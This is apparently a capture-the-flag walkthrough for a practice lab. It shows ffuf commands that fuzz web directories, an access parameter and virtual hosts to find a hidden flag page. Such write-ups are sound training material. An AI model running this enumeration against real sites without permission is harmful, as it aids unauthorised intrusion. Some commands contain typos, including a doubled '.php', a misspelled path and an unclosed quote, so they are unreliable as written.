Conduct a web directory fuzzing attack

`ffuf -w <path to wordlist common.txt> -u http://<target-IP>:<port>/FUZZ`

Add important directory to fuzz, such as admin and specify files.

`ffuf -w <path to wordlist common.txt> -u http://<target-IP>:<port>/admin/FUZZ -e .php,.html,.txt`

Follow successful results such as [Status: 200], in this case panel.php. The web page shows accessID needs to be set correct. 

First run we notice many irrelevant files with the size of 58, we can filter those out with -fs 58.

`ffuf -w <path to wordlist common.txt> -u http://<target-IP>:<port>/admin/panel.php.php?accessID=FUZZ -fs 58`

We reveal the getaccess, accessID. 
we can not curl for the contents using 

`curl <target-ip>:<port>/admiin/panel.php?accessID=getaccess`

This command reveals to head over to fuzzing_fun.htb, which we can curl to see its contents

curl fuzzing_fun.htb, reveals to use the godeep directory on the Vhost

this can be executed using ffuf

`ffuf -w <path to wordlist common.txt> -u http://<target-IP>:<port> -H 'Host: FUZZ.fuzzing_fun.htb -fc 403`

This will reveal the vhost named hidden. 

we can now begin a recursion on the full path to find the flag. 

`ffuf -w <path to wordlist common.txt> -u http://hidden.fuzzing_fun.htb:<port>/godeep/FUZZ -recursion -fc 403 -v `

Allowing the recurssion to complete will reveal: http://hidden.fuzzing_fun.htb:33315/godeep/stoneedge/bbclone/typo3/index.php which houses the flag. 